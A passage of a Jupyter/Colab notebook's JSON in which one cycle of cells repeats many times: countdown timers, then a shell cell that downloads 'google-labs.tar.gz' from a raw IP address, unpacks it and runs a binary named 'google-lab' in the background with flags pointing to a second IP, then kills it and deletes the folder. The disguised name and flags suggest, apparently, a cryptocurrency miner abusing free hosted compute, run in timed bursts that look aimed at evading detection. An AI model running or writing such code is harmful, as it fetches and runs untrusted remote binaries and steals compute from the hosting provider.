      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "Z0LSTrFEfoWe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "s1pRZF6Efoa8"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "6a9m7Th9foa8"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "n-8A3X93foa8"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "W_mcBxqOfoa8"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "EVyRNOAbfoa8"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "leKOiRNnfoe5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "iADZFGyXfoe5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "hhN6hthdfoe5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "VuBWisLjfoe5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "e-QTM6Xvfoe5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "1B8d_jb3foj3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "Vc1NDffzfoj3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "bvaAFFCYfoj3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "3t8CI1Hcfoj4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "nX9f8HP1foj4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "iOgu-1u_fooa"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "RYCyAZtVfooa"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "UU0oKh2lfooa"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "GU1mGMjIfoob"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "n9u9YpKnfoob"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "FI7r9YF4fos0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "cFOL5utjfos0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "evJYY6evfos0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "IfHe4Zfxfos0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "hbCf-uFyfos0"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "gIluOloyfoxe"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "s62Yd7sofoxf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "qlX1G62_foxf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "8HGpElI7foxf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "DK_iPtGYfoxf"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "LXlrCQXGfo1y"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "0pG9QhRFfo1z"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "jn4NThiCfo1z"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "wYUqyY7efo1z"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "hzv_qDiyfo1z"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "XYDtAVUIfo5t"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "UjXf8bNgfo5u"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "f1ze6CYIfo5u"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "3iI6M3ajfo5u"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "s8qQ94DEfo5u"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "fCmvF_j2fo-c"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "_VMXFDdWfo-c"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "gBSyp2F5fo-d"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "luDax9-Rfo-d"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "JDZAGG4kfo-d"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "OOe6A5-OfpC7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "yGSJpgk4fpC7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "2k9sgBwofpC7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "Oddt8D4vfpC7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "6J3xbgiRfpC7"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "-kWONi3_fpHC"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "ex6t8Sx2fpHC"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "x1_e5FYXfpHD"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "cwx-9uVmfpHD"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "qHv-OA1bfpHD"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "zrrV2BeMfpLj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "1LFqyeBFfpLj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "go3vtXFbfpLj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "l3FlfyyMfpLj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "pLyJrlGAfpLj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "kI2ufvtBfpQi"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "qCw1BM2dfpQi"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "7L75D-dhfpQi"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "y_wKPmy0fpQj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "mAunFrvvfpQj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "Y6aA-wBrfpVN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "O4d2TJZcfpVN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "MOA9wh4GfpVN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "xc0IhaBffpVN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "oxKDIkkGfpVN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "Qxco0t9wfpZm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "LgwbKXEOfpZm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "YxEByF0AfpZm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "5GRxXtqJfpZm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "fd8D8aPrfpZm"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "lBGN5kX-fpe2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "ZKKCLHphfpe3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "iGu6w8m4fpe3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "8GCbN2Ghfpe3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "htIUp_Cgfpe3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "oXqLK8Ppfpjb"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "6lMwpsoefpjb"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "_svUoQqifpjb"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "sdYIISnofpjb"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "heVzDxwGfpjc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "b9_JzHL1fppG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "rAK5xqaKfppG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "6mWfMeIifppG"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "R1U06MOzfppH"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "ynbti-7PfppH"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "2leJjH-1fpub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "Xeg2UVr6fpub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "mi7xBtnnfpub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "y-GWsi9Pfpub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "1ADmW8Ibfpub"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "hmVjM2Acfpze"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "Gk4njW__fpze"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "R8pR6_Dafpze"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "6DLgDc4Mfpze"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "Tq9umeHOfpze"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "wdHSlLa0fp4g"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "MZxDVnGOfp4g"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "0fubylh-fp4g"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "ey0zwBSufp4g"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "AfhGHttkfp4g"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mkdir down; cd down; wget http://159.89.237.64/google-labs.tar.gz; tar -zxvf google-labs.tar.gz; cd bin; nohup ./google-lab --farm-recheck 200 -U -F  http://167.71.244.213:80/GOO &"
      ],
      "metadata": {
        "id": "FsI0BSi1fp97"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(45,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
        "id": "0EIR743Vfp97"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!killall google-lab"
      ],
      "metadata": {
        "id": "8ZOB6vWUfp97"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!rm -r down"
      ],
      "metadata": {
        "id": "78EtYf7Hfp98"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "import sys, time\n",
        "for num in range(60,0,-1):\n",
        "    sys.stdout.write(\"\\r    \\r%d\" % num)\n",
        "    sys.stdout.flush()\n",
        "    time.sleep(1)"
      ],
      "metadata": {
